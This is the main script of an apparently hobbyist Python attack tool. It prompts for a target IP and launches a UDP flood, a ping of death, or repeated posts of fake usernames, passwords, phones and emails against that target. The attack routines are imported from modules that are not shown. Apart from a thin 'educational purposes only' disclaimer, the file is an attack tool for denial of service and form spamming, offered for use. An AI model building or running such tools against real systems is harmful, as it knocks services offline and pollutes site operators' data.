# ! /usr/bin/python
# """
# /* #############################################################################
# **    File           : main.py
# **    Proyect        : DoS-BruteForce-FakeData-Attack
# **    IDE            : Visual Studio Code
# **    Language       : Python 3.9.7
# **    OS             :
# **    Date/Hour      : 03/31/2022
# **    Description    :
# **         A Python tool to perform DoS, brute force and fake data fill attacks
# **         For educational purposes only*
# **   Authors         :
# **            Gerardo B Zenteno M. https://github.com/GerardoBZentenoM
# **
# **   Versión        : Beta
# **   Revisión       : A
# **   Release        : 0.0.2
# **   Bugs & Fixes   :
# **
# **   Date           :
# **
# **
# **   Usage          : sudo ./.venv/bin/python3.9 main.py main.py
#    ###########################################################################*/
# """
import os

from attacks import attack_flood_udp, fake_data, ping_of_death
from sources.art import welcome
from validations import target_validation


print(welcome)
print(
    "Description: A Python tool to perform UDP Flood, brute force and fake data fill attacks."
)
print("Please, only use this to educational propose.")
print("DON'T USE IN LEGITIM WEBSITES.\n")

if "SUDO_UID" not in os.environ.keys():
    print("Try running this program with sudo.")
    print("Try with: 'sudo ./.venv/bin/python3.9 main.py main.py'")
    exit()


target = input("Enter the IP address to test ej. http://localhost \n")
target_ip, target_net = target_validation(target)

print(f"The direcction of the target is: {target_ip} net: {target_net}")

attack = input(
    """
Select some of the folowing tests:
1) Post random and fake data
2) UDP Flood
3) Ping of the death test

: """
)

if attack == "1":
    number_of_requests = int(
        input("Select the number of requests do you want, ej. 10: ")
    )
    for _ in range(number_of_requests):
        credentials = fake_data(
            target, username=True, password=True, phone=True, email=True
        )
        print("Post in the target the following data: ")
        print(credentials)

elif attack == "2":
    test_duration = int(
        input("Select the duration of the test (in seconds) ej, 10\n:  ")
    )
    attack_flood_udp(test_duration, target_ip)

else:
    test_duration = int(
        input("Select the duration of the test (in seconds) ej, 10\n:  ")
    )
    ping_of_death(test_duration, target_ip)
